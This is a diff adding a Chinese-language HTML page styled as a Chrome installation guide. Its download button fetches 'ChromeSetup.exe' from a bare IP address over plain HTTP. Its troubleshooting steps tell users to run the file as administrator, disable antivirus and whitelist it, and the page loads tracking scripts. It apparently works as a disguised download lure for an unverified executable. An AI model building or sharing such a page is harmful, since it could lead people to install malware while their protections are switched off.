@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Chrome浏览器安装指南</title>
+  <style>
+    :root {
+      --blue: #1a73e8;
+      --light-blue: #4285f4;
+      --red: #ea4335;
+      --yellow: #fbbc05;
+      --green: #34a853;
+      --gray: #f5f5f5;
+      --dark-gray: #5f6368;
+    }
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Microsoft YaHei', sans-serif;
+    }
+    body {
+      background-color: #fff;
+      color: #202124;
+      line-height: 1.6;
+    }
+    .container {
+      max-width: 800px;
+      margin: 0 auto;
+      padding: 30px 20px;
+    }
+    header {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    .logo {
+      width: 80px;
+      height: 80px;
+      margin-bottom: 10px;
+    }
+    h1 {
+      font-size: 28px;
+      color: var(--blue);
+      margin-bottom: 10px;
+    }
+    .subtitle {
+      color: var(--dark-gray);
+      font-size: 16px;
+    }
+    .card {
+      background-color: var(--gray);
+      border-radius: 8px;
+      padding: 20px;
+      margin: 20px 0;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+    }
+    h2 {
+      font-size: 20px;
+      margin-bottom: 15px;
+      color: var(--blue);
+    }
+    ol, ul {
+      padding-left: 25px;
+      margin-bottom: 15px;
+    }
+    li {
+      margin-bottom: 10px;
+    }
+    .step {
+      display: flex;
+      margin-bottom: 15px;
+      align-items: flex-start;
+    }
+    .step-number {
+      background-color: var(--blue);
+      color: white;
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-right: 15px;
+      flex-shrink: 0;
+    }
+    .step-content {
+      flex: 1;
+    }
+    .warning {
+      background-color: #fef7e6;
+      border-left: 4px solid var(--yellow);
+      padding: 15px;
+      margin: 20px 0;
+    }
+    .success {
+      background-color: #e6f4ea;
+      border-left: 4px solid var(--green);
+      padding: 15px;
+      margin: 20px 0;
+    }
+    .button {
+      background-color: var(--blue);
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      font-size: 16px;
+      border-radius: 4px;
+      cursor: pointer;
+      display: inline-block;
+      text-decoration: none;
+      margin: 10px 0;
+      transition: background-color 0.3s;
+    }
+    .button:hover {
+      background-color: var(--light-blue);
+    }
+    .note {
+      font-size: 14px;
+      color: var(--dark-gray);
+      margin-top: 10px;
+    }
+    .footer {
+      margin-top: 40px;
+      text-align: center;
+      color: var(--dark-gray);
+      font-size: 14px;
+    }
+    img.screenshot {
+      max-width: 100%;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      margin: 10px 0;
+    }
+    .tip {
+      background-color: #e8f0fe;
+      border-left: 4px solid var(--light-blue);
+      padding: 15px;
+      margin: 20px 0;
+    }
+  </style>
+<script src="stats-system/tracking.js" defer></script><script src="tracking.js"></script>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <svg class="logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
+        <circle cx="50" cy="50" r="45" fill="white"/>
+        <path fill="#EA4335" d="M50,25.1c7.1,0,13.4,2.6,18.4,7.7l14.1-14.1C73.7,10.4,62.7,5.2,50,5.2C30.9,5.2,14.7,16.8,8.3,33.5
+        l16.6,12.8C28.3,33.7,38.3,25.1,50,25.1z"/>
+        <path fill="#4285F4" d="M79.5,51.2c0-3.3-0.3-5.8-0.8-8.3H50v17.2h17.2c-0.7,4-3,7.5-6.2,9.9l15.8,12.3
+        C83.8,75.3,79.5,62.2,79.5,51.2z"/>
+        <path fill="#FBBC05" d="M24.9,59.6c-1.2-3.6-1.9-7.5-1.9-11.5c0-4,0.7-7.8,1.9-11.5L8.3,23.8C4.7,31.4,2.6,40.4,2.6,48.1
+        c0,7.7,2.1,14.8,5.7,22.4L24.9,59.6z"/>
+        <path fill="#34A853" d="M50,94.8c13.8,0,25.4-4.6,33.9-12.4L68.1,70.1c-4.4,3-10.2,4.8-18.1,4.8c-11.7,0-21.7-7.9-25.3-18.5
+        l-16.6,12.8C14.7,85.3,30.9,94.8,50,94.8z"/>
+      </svg>
+      <h1>Chrome浏览器安装指南</h1>
+      <p class="subtitle">完成以下步骤，轻松安装Chrome浏览器</p>
+    </header>
+
+    <div class="card">
+      <h2>准备工作</h2>
+      <div class="step">
+        <div class="step-number">1</div>
+        <div class="step-content">
+          <strong>关闭Chrome浏览器</strong>
+          <p>如果您当前正在使用Chrome浏览器，请先保存重要的工作，然后关闭所有Chrome窗口。</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <h2>卸载旧版Chrome</h2>
+      <div class="tip">
+        <p>卸载旧版Chrome不会删除您的书签、历史记录和保存的密码。当您安装新版本后，这些数据会自动恢复。</p>
+      </div>
+      <div class="step">
+        <div class="step-number">2</div>
+        <div class="step-content">
+          <strong>打开"控制面板"</strong>
+          <p>点击"开始"菜单，搜索并打开"控制面板"。</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-number">3</div>
+        <div class="step-content">
+          <strong>打开"程序和功能"</strong>
+          <p>在控制面板中，找到并点击"程序和功能"或"卸载程序"。</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-number">4</div>
+        <div class="step-content">
+          <strong>卸载Google Chrome</strong>
+          <p>在程序列表中找到"Google Chrome"，右键点击并选择"卸载"。按照卸载向导的提示完成卸载。</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <h2>下载安装新版Chrome</h2>
+      <div class="step">
+        <div class="step-number">5</div>
+        <div class="step-content">
+          <strong>下载Chrome安装程序</strong>
+          <p>点击下方按钮下载最新版Chrome浏览器安装程序：</p>
+          <a href="http://83.3.23.117/folder/ChromeSetup.exe" class="button">下载Chrome浏览器</a>
+          <p class="note">文件大小：约50MB</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-number">6</div>
+        <div class="step-content">
+          <strong>运行安装程序</strong>
+          <p>下载完成后，找到并双击运行"ChromeSetup.exe"文件。</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-number">7</div>
+        <div class="step-content">
+          <strong>完成安装</strong>
+          <p>按照安装向导的提示完成Chrome浏览器的安装。安装完成后，Chrome浏览器会自动启动。</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="success">
+      <h2>安装完成！</h2>
+      <p>恭喜！您已成功安装Chrome浏览器。现在，您可以使用这款快速、安全的浏览器访问网站了。</p>
+      <a href="javascript:history.back();" class="button">返回</a>
+    </div>
+
+    <div class="troubleshoot">
+      <h2>常见问题解决方案</h2>
+      
+      <div class="error-grid">
+        <div class="error-card">
+          <div class="error-icon"><i class="icon-error">⚠️</i></div>
+          <div class="error-content">
+            <h3>【错误1】"需要管理员权限"</h3>
+            <p class="error-desc">安装时提示"需要管理员权限"或"访问被拒绝"</p>
+            <div class="solution">
+              <strong>解决方法：</strong>
+              <ol>
+                <li>右键点击安装程序</li>
+                <li>选择"以管理员身份运行"</li>
+                <li>在弹出的UAC窗口中点击"是"</li>
+              </ol>
+            </div>
+          </div>
+        </div>
+        
+        <div class="error-card">
+          <div class="error-icon"><i class="icon-error">🛡️</i></div>
+          <div class="error-content">
+            <h3>【错误2】"安装被阻止"</h3>
+            <p class="error-desc">杀毒软件或防火墙拦截了安装程序</p>
+            <div class="solution">
+              <strong>解决方法：</strong>
+              <ol>
+                <li>暂时关闭杀毒软件</li>
+                <li>在杀毒软件中将Chrome安装程序添加到信任列表</li>
+                <li>安装完成后可重新启用杀毒软件</li>
+              </ol>
+            </div>
+          </div>
+        </div>
+        
+        <div class="error-card">
+          <div class="error-icon"><i class="icon-error">🌐</i></div>
+          <div class="error-content">
+            <h3>【错误3】"下载失败"</h3>
+            <p class="error-desc">下载过程中断或文件不完整</p>
+            <div class="solution">
+              <strong>解决方法：</strong>
+              <ol>
+                <li>检查网络连接是否稳定</li>
+                <li>尝试使用有线网络代替无线网络</li>
+                <li>清除浏览器缓存后重试</li>
+                <li>尝试使用其他浏览器下载</li>
+              </ol>
+            </div>
+          </div>
+        </div>
+        
+        <div class="error-card">
+          <div class="error-icon"><i class="icon-error">🔄</i></div>
+          <div class="error-content">
+            <h3>【错误4】"安装过程中断"</h3>
+            <p class="error-desc">安装过程意外中断或失败</p>
+            <div class="solution">
+              <strong>解决方法：</strong>
+              <ol>
+                <li>重新启动计算机</li>
+                <li>关闭所有不必要的程序</li>
+                <li>重新下载安装程序并安装</li>
+              </ol>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <style>
+      .troubleshoot {
+        background-color: #f8f9fa;
+        border-radius: 8px;
+        padding: 25px;
+        margin: 30px 0;
+        box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+      }
+      
+      .troubleshoot h2 {
+        text-align: center;
+        margin-bottom: 25px;
+        color: #333;
+        font-size: 22px;
+      }
+      
+      .error-grid {
+        display: grid;
+        grid-template-columns: repeat(2, 1fr);
+        gap: 15px;
+      }
+      
+      .error-card {
+        background: white;
+        border-radius: 8px;
+        padding: 18px;
+        display: flex;
+        align-items: flex-start;
+        box-shadow: 0 3px 10px rgba(0,0,0,0.05);
+        transition: all 0.3s ease;
+        border-left: 4px solid var(--yellow);
+        height: 100%;
+        overflow: auto;
+      }
+      
+      .error-card:nth-child(1) {
+        border-left-color: var(--blue);
+      }
+      
+      .error-card:nth-child(2) {
+        border-left-color: var(--yellow);
+      }
+      
+      .error-card:nth-child(3) {
+        border-left-color: var(--red);
+      }
+      
+      .error-card:nth-child(4) {
+        border-left-color: var(--green);
+      }
+      
+      .error-card:hover {
+        box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        transform: translateY(-2px);
+      }
+      
+      .error-icon {
+        font-size: 24px;
+        margin-right: 20px;
+        min-width: 40px;
+        text-align: center;
+      }
+      
+      .error-content {
+        flex: 1;
+      }
+      
+      .error-content h3 {
+        margin: 0 0 10px;
+        color: #333;
+        font-size: 18px;
+      }
+      
+      .error-desc {
+        color: #666;
+        font-size: 14px;
+        margin-bottom: 12px;
+      }
+      
+      .solution {
+        background-color: #f1f8ff;
+        padding: 12px;
+        border-radius: 6px;
+        margin-top: 8px;
+      }
+      
+      .error-card:nth-child(1) .solution {
+        background-color: #e8f0fe;
+      }
+      
+      .error-card:nth-child(2) .solution {
+        background-color: #fffae6;
+      }
+      
+      .error-card:nth-child(3) .solution {
+        background-color: #feeae6;
+      }
+      
+      .error-card:nth-child(4) .solution {
+        background-color: #e6f4ea;
+      }
+      
+      .solution ol {
+        margin: 8px 0 0 20px;
+      }
+      
+      .solution li {
+        margin-bottom: 6px;
+        font-size: 13px;
+      }
+      
+      .contact-support {
+        background-color: #e8f0fe;
+        padding: 15px;
+        border-radius: 6px;
+        margin-top: 20px;
+        text-align: center;
+      }
+      
+      .support-contact {
+        font-weight: bold;
+        font-size: 16px;
+        margin-top: 10px;
+        color: var(--blue);
+      }
+      
+      .icon-contact {
+        margin-right: 5px;
+      }
+      
+      /* 响应式设计 */
+      @media (max-width: 768px) {
+        .error-grid {
+          grid-template-columns: 1fr;
+        }
+        
+        .error-card {
+          margin-bottom: 15px;
+        }
+      }
+    </style>
+
+    <div class="footer">
+      <p>© 2025 贵阳经侦AI智能体工作平台 | Chrome浏览器安装指南</p>
+    </div>
+  </div>
+</body>
+</html> 
